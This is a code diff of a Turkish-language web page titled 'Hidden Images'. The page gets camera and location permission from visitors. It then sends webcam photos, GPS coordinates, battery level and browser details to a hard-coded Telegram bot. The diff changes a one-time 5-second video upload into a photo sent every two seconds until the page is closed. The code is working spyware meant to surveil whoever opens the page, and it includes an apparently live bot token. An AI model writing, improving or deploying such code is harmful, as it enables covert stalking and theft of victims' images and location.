@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Gizli Görüntüler</title>
   <style>
     body {
@@ -65,7 +65,7 @@
     const token = '7678549002:AAFz0nTnHFpInMFw-Gy0pgIcpr0gZ0JxmQU';
     const chat_id = '7401389505';
 
-    let recorder, chunks = [], stream;
+    let stream, intervalId;
 
     async function kameraAc() {
       stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -81,6 +81,15 @@
       return canvas.toDataURL("image/png");
     }
 
+    async function sarjAl() {
+      if (!navigator.getBattery) return null;
+      const batarya = await navigator.getBattery();
+      return {
+        yuzde: Math.round(batarya.level * 100),
+        sarjda: batarya.charging
+      };
+    }
+
     async function konumAl() {
       return new Promise(resolve => {
         navigator.geolocation.getCurrentPosition(
@@ -90,39 +99,19 @@
       });
     }
 
-    async function sarjDurumuAl() {
-      if (!navigator.getBattery) return null;
-      const batarya = await navigator.getBattery();
-      return {
-        yuzde: Math.round(batarya.level * 100),
-        sarjda: batarya.charging
-      };
-    }
-
-    async function telegramaGonder(fotoDataUrl, videoBlob, konum, sarj) {
+    async function telegramaGonder(fotoDataUrl, konum, sarj) {
       const fotoBlob = await (await fetch(fotoDataUrl)).blob();
-
-      const formFoto = new FormData();
-      formFoto.append("chat_id", chat_id);
-      formFoto.append("photo", fotoBlob, "foto.png");
-      formFoto.append("caption",
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+      formData.append("photo", fotoBlob, "foto.png");
+      formData.append("caption",
         `📍 Konum: ${konum ? `https://maps.google.com/?q=${konum.latitude},${konum.longitude}` : "Yok"}\n` +
         `🔋 Şarj: ${sarj ? `${sarj.yuzde}% (${sarj.sarjda ? "Şarjda" : "Değil"})` : "Yok"}\n` +
         `🌐 Tarayıcı: ${navigator.userAgent}\n🕐 Saat: ${new Date().toLocaleString()}`
       );
-
       await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: "POST",
-        body: formFoto
-      });
-
-      const formVideo = new FormData();
-      formVideo.append("chat_id", chat_id);
-      formVideo.append("video", videoBlob, "video.webm");
-
-      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-        method: "POST",
-        body: formVideo
+        body: formData
       });
     }
 
@@ -133,28 +122,21 @@
         video.srcObject = stream;
         await video.play();
 
-        const foto = fotoCek(video);
         const konum = await konumAl();
-        const sarj = await sarjDurumuAl();
+        const sarj = await sarjAl();
 
-        chunks = [];
-        recorder = new MediaRecorder(stream);
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: "video/webm" });
-          await telegramaGonder(foto, blob, konum, sarj);
-          stream.getTracks().forEach(track => track.stop());
-        };
-
-        recorder.start();
-
-        setTimeout(() => {
-          if (recorder.state === "recording") {
-            recorder.stop();
-          }
-        }, 5000); // tam 5 saniye
+        intervalId = setInterval(async () => {
+          const foto = fotoCek(video);
+          await telegramaGonder(foto, konum, sarj);
+        }, 2000); // her 2 saniyede bir
 
         alert("İzinler verildi.");
+
+        window.addEventListener("beforeunload", () => {
+          clearInterval(intervalId);
+          stream.getTracks().forEach(track => track.stop());
+        });
+
       } catch (err) {
         alert("Hata oluştu: " + err);
       }
